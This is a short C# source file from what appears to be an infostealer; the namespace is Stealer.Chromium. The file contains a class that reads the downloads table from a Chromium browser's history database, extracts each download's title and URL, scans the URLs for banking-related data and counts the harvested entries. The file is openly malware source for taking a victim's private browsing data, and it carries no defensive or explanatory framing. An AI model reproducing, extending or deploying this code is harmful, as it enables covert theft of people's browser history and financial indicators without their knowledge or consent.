using System.Collections.Generic;

namespace Stealer.Chromium;

internal sealed class Downloads
{
	public static List<Site> Get(string sHistory)
	{
		try
		{
			List<Site> list = new List<Site>();
			SQLite sQLite = SqlReader.ReadTable(sHistory, "downloads");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Site item = default(Site);
				item.sTitle = Crypto.GetUTF8(sQLite.GetValue(i, 2));
				item.sUrl = Crypto.GetUTF8(sQLite.GetValue(i, 17));
				Banking.ScanData(item.sUrl);
				Counter.Downloads++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Site>();
		}
	}
}
